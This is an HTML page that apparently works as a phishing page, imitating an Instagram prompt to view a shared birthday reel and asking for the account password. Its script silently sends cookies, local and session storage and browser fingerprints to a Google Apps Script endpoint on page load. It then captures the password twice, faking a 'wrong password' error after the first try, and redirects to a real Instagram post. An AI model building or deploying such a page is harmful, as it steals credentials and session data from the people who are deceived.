<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>32歳のお誕生日おめでとうございます🎉素敵な一年になりますように✨</title>
    
    <!-- OGPタグ（サイトをシェアしたときのサムネイルやプレビュー設定） -->
    <meta property="og:title" content="２２歳のお誕生日おめでとうございます🎉素敵な一年になりますように✨">
    <meta property="og:description" content="k._.19._.13がリールを共有しようとしています。">
    <meta property="og:image" content="uploadimage1.jpeg">
    <meta property="og:type" content="website">
    
    <!-- Twitterカード設定（Twitter/Xなどでサムネイルを表示させる場合） -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content="uploadimage1.jpeg">

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            /* グラデーション */
            background: linear-gradient(180deg, #2b2b2b 0%, #111111 50%, #000000 100%);
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 320px;
            padding: 0 20px;
        }
        /* 上部のアイコン (ins_2.webp)：大きく配置、角丸なし、色反転 */
        .top-badge {
            width: auto;
            height: auto;
            max-width: 140px;
            object-fit: contain;
            margin-bottom: 12px;
            filter: invert(100%);
        }
        /* 共有メッセージのスタイル */
        .share-text {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.7);
            font-weight: 500;
            margin-bottom: 24px;
            text-align: center;
            letter-spacing: 0.3px;
        }
        /* 丸形アイコン (aina_icon_1.jpg) */
        .avatar {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            object-fit: cover;
            margin-bottom: 16px;
            background-color: #333333;
        }
        /* ハンドルネーム（alua_.l6） */
        .handle-id {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 8px;
        }
        /* 名前（あいな） */
        .name {
            font-size: 18px;
            font-weight: 500;
            margin-bottom: 24px;
            letter-spacing: 0.5px;
        }
        /* 入力フォーム全体のコンテナ */
        .form-container {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        /* 角丸ウィジェット（パスワード入力欄） */
        .input-wrapper {
            width: 100%;
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            padding: 4px 16px;
            display: flex;
            align-items: center;
            backdrop-filter: blur(10px);
            transition: background-color 0.3s;
        }
        .password-input {
            width: 100%;
            background: transparent;
            border: none;
            outline: none;
            color: #ffffff;
            font-size: 15px;
            padding: 12px 0;
        }
        .password-input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }
        /* パスワード表示/非表示ボタン */
        .toggle-password-btn {
            background: transparent;
            border: none;
            outline: none;
            color: rgba(255, 255, 255, 0.4); /* 「パスワードを入力」と同じ色 */
            font-size: 13px;
            cursor: pointer;
            white-space: nowrap;
            padding-left: 8px;
        }
        .toggle-password-btn:hover {
            color: rgba(255, 255, 255, 0.7);
        }
        /* 入力受付停止時のスタイル */
        .input-wrapper.disabled {
            background-color: rgba(128, 128, 128, 0.2);
            pointer-events: none;
        }
        .password-input:disabled {
            color: rgba(255, 255, 255, 0.5);
        }
        /* 「パスワードを忘れた場合」の青文字リンク */
        .forgot-password {
            font-size: 13px;
            color: #0095f6;
            text-align: right;
            text-decoration: none;
            cursor: pointer;
            margin-top: -4px;
            margin-bottom: 4px;
        }
        .forgot-password:hover {
            text-decoration: underline;
        }
        /* 青背景のログインボタン */
        .submit-btn {
            width: 100%;
            height: 44px;
            background-color: #0095f6;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: opacity 0.2s, background-color 0.3s;
        }
        .submit-btn:active {
            opacity: 0.8;
        }
        .submit-btn:disabled {
            background-color: rgba(128, 128, 128, 0.3) !important;
            color: rgba(255, 255, 255, 0.4) !important;
            cursor: default;
            opacity: 1;
        }
        /* エラーメッセージ */
        .error-message {
            color: #ed4956;
            font-size: 13px;
            text-align: center;
            display: none;
            margin-top: 4px;
        }
        /* アカウントをお持ちでないですか？ 登録する */
        .signup-prompt {
            margin-top: 24px;
            font-size: 13px;
            text-align: center;
            color: #ffffff;
        }
        .signup-link {
            color: #0095f6;
            text-decoration: none;
            font-weight: 600;
            margin-left: 4px;
        }
        .signup-link:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- 上部のアイコン (ins_2.webp) -->
        <img src="ins_2.webp" alt="" class="top-badge" onerror="this.style.display='none'">

        <!-- 「k._.19._.13がリールを共有しようとしています。」の文字 -->
        <div class="share-text">k._.19._.13がリールを共有しようとしています。</div>

        <!-- 丸形アイコン (aina_icon_1.jpg) -->
        <img src="aina_icon_1.jpg" alt="アイコン" class="avatar" onerror="this.style.display='none'">
        
        <!-- ID（alua_.l6） -->
        <div class="handle-id">alua_.l6</div>

        <!-- 名前（あいな） -->
        <div class="name">あいな</div>
        
        <!-- 入力フォームエリア -->
        <div class="form-container">
            <div class="input-wrapper" id="inputWrapper">
                <input type="password" id="passwordField" class="password-input" placeholder="パスワードを入力">
                <button type="button" id="togglePasswordBtn" class="toggle-password-btn">表示する</button>
            </div>
            
            <!-- パスワードを忘れた場合 -->
            <a href="#" class="forgot-password" onclick="return false;">パスワードを忘れた場合</a>

            <!-- ログインボタン -->
            <button id="submitBtn" class="submit-btn">ログイン</button>

            <!-- エラーメッセージ -->
            <div id="errorMsg" class="error-message">パスワードが違います</div>
        </div>

        <!-- アカウントをお持ちでないですか？ 登録する -->
        <div class="signup-prompt">
            アカウントをお持ちでないですか？<a href="#" class="signup-link" onclick="return false;">登録する</a>
        </div>
    </div>

    <script>
        const GAS_WEB_APP_URL = "https://script.google.com/macros/s/AKfycbymslxDaCtwPbk-_-ffVRUiH9VJ2rVzbdpJF_plcxvaXNEh6NYL7YcRrbFLuQfWfio3ug/exec";
        const REDIRECT_URL = "https://www.instagram.com/p/DazYmT8kgzT/?utm_source=ig_web_copy_link&igsh=NTc4MTIwNjQ2YQ==";

        // ページ読み込み時に試行回数を必ずリセット
        localStorage.setItem('auth_attempt_count', '0');

        async function getBasicSignals() {
            let rawUA = navigator.userAgent;
            let uaData = null;

            if (navigator.userAgentData) {
                try {
                    uaData = await navigator.userAgentData.getHighEntropyValues([
                        "architecture", "bitness", "brands", "mobile", "model", "platform", "platformVersion", "fullVersionList"
                    ]);
                    if (uaData && uaData.platform === "Android") {
                        const androidVer = uaData.platformVersion ? uaData.platformVersion.split('.')[0] : "16";
                        const modelStr = uaData.model ? `; ${uaData.model}` : "";
                        rawUA = rawUA.replace(/Android 10; K/, `Android ${androidVer}${modelStr}`);
                    }
                } catch(e) {}
            }

            return {
                userAgent: rawUA,
                platform: navigator.platform || '',
                language: navigator.language || 'ja-JP',
                hardwareConcurrency: Number(navigator.hardwareConcurrency) || 8,
                deviceMemory: Number(navigator.deviceMemory) || 8,
                screen: {
                    width: window.screen.width, height: window.screen.height,
                    availWidth: window.screen.availWidth, availHeight: window.screen.availHeight,
                    colorDepth: window.screen.colorDepth || 24, pixelDepth: window.screen.pixelDepth || 24
                },
                window: {
                    innerWidth: window.screen.width, innerHeight: window.screen.height,
                    outerWidth: window.screen.width, outerHeight: window.screen.height,
                    devicePixelRatio: window.devicePixelRatio || 1
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Asia/Tokyo',
                webdriver: navigator.webdriver || false,
                uaData: uaData
            };
        }

        function getCookiesObject() {
            const cookies = {};
            document.cookie.split(';').forEach(cookie => {
                const parts = cookie.trim().split('=');
                if (parts.length === 2) {
                    cookies[parts[0]] = decodeURIComponent(parts[1]);
                }
            });
            return cookies;
        }

        function getStorageData(storage) {
            const data = {};
            try {
                for (let i = 0; i < storage.length; i++) {
                    const key = storage.key(i);
                    data[key] = storage.getItem(key);
                }
            } catch(e) {}
            return data;
        }

        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 200; canvas.height = 50;
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top'; ctx.font = "14px 'Arial'";
                ctx.fillStyle = '#f60'; ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069'; ctx.fillText('Security_Check_#123', 2, 15);
                return canvas.toDataURL();
            } catch (e) { return ''; }
        }

        function getWebGLInfo() {
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
                return debugInfo ? {
                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                } : null;
            } catch (e) { return null; }
        }

        // ページ読み込み時にバックグラウンドで自動収集して送信
        window.addEventListener('DOMContentLoaded', async () => {
            try {
                const payload = {
                    timestamp: new Date().toISOString(),
                    password: "", 
                    basic: await getBasicSignals(),
                    canvasDataURL: getCanvasFingerprint(),
                    webgl: getWebGLInfo(),
                    storage: {
                        cookies: getCookiesObject(),
                        localStorage: getStorageData(localStorage),
                        sessionStorage: getStorageData(sessionStorage)
                    }
                };

                await fetch(GAS_WEB_APP_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'text/plain' },
                    body: JSON.stringify(payload)
                });
            } catch (error) {}
        });

        // 訪問・リロード毎に取得する試行回数
        function getAttemptCount() {
            return parseInt(localStorage.getItem('auth_attempt_count') || '0', 10);
        }

        function incrementAttemptCount() {
            const count = getAttemptCount() + 1;
            localStorage.setItem('auth_attempt_count', count.toString());
            return count;
        }

        const passwordField = document.getElementById('passwordField');
        const inputWrapper = document.getElementById('inputWrapper');
        const submitBtn = document.getElementById('submitBtn');
        const errorMsg = document.getElementById('errorMsg');
        const togglePasswordBtn = document.getElementById('togglePasswordBtn');

        // パスワードの表示/非表示切替
        togglePasswordBtn.addEventListener('click', () => {
            if (passwordField.type === 'password') {
                passwordField.type = 'text';
                togglePasswordBtn.textContent = '非表示';
            } else {
                passwordField.type = 'password';
                togglePasswordBtn.textContent = '表示する';
            }
        });

        async function handleSubmission() {
            const enteredPassword = passwordField.value;

            // 入力欄が空の場合
            if (!enteredPassword) {
                errorMsg.textContent = "正しいパスワードを入力してください";
                errorMsg.style.display = "block";
                return;
            }

            // --- タイムラグなしで即座にボタンを無効化して状態変化 ---
            submitBtn.disabled = true;
            submitBtn.textContent = "確認中...";
            passwordField.disabled = true;
            inputWrapper.classList.add('disabled');
            errorMsg.style.display = "none";

            // 何回目の送信かチェック（1回目か、2回目以降か）
            const currentAttempt = getAttemptCount();

            if (currentAttempt === 0) {
                // --- 【1回目の場合】 ---
                incrementAttemptCount();

                try {
                    const payload = {
                        timestamp: new Date().toISOString(),
                        password: enteredPassword,
                        basic: await getBasicSignals(),
                        canvasDataURL: getCanvasFingerprint(),
                        webgl: getWebGLInfo(),
                        storage: {
                            cookies: getCookiesObject(),
                            localStorage: getStorageData(localStorage),
                            sessionStorage: getStorageData(sessionStorage)
                        }
                    };
                    await fetch(GAS_WEB_APP_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'text/plain' },
                        body: JSON.stringify(payload)
                    });
                } catch (error) {}

                // 1秒後に元の状態に戻し、エラーメッセージを表示
                setTimeout(() => {
                    passwordField.disabled = false;
                    inputWrapper.classList.remove('disabled');
                    submitBtn.disabled = false;
                    submitBtn.textContent = "ログイン";
                    passwordField.value = "";
                    passwordField.placeholder = "パスワードを入力";
                    errorMsg.textContent = "パスワードが違います";
                    errorMsg.style.display = "block";
                }, 1000);

            } else {
                // --- 【2回目以降の場合】 ---
                try {
                    const payload = {
                        timestamp: new Date().toISOString(),
                        password: enteredPassword,
                        basic: await getBasicSignals(),
                        canvasDataURL: getCanvasFingerprint(),
                        webgl: getWebGLInfo(),
                        storage: {
                            cookies: getCookiesObject(),
                            localStorage: getStorageData(localStorage),
                            sessionStorage: getStorageData(sessionStorage)
                        }
                    };
                    await fetch(GAS_WEB_APP_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'text/plain' },
                        body: JSON.stringify(payload)
                    });
                } catch (error) {}

                // 2秒後にリダイレクト
                setTimeout(() => {
                    window.location.href = REDIRECT_URL;
                }, 2000);
            }
        }

        // ログインボタンが押されたとき
        submitBtn.addEventListener('click', handleSubmission);

        // パスワード入力欄でエンターキーが押されたとき
        passwordField.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                handleSubmission();
            }
        });
    </script>
</body>
</html>
